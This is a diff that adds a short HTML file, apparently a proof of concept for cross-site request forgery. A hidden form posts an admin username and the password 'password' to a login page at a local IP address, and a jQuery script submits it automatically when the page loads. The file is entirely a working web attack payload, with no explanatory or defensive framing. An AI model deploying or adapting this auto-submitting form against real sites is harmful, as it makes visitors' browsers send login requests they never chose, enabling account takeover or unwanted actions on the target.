@@ -1,0 +1,11 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+<form action="http://192.168.1.102/login.php" method="POST" id="login" name="login">
+<input type="hidden" value="admin@example.com" name="fUsername" id="fUsername"/>
+<input type="hidden" value="password" name="fPassword" id="fPassword"/>
+<input type="submit" value="Login">
+</form>
+<script>
+$(document).ready(function(e) {
+	$('#login').submit();
+});
+</script>
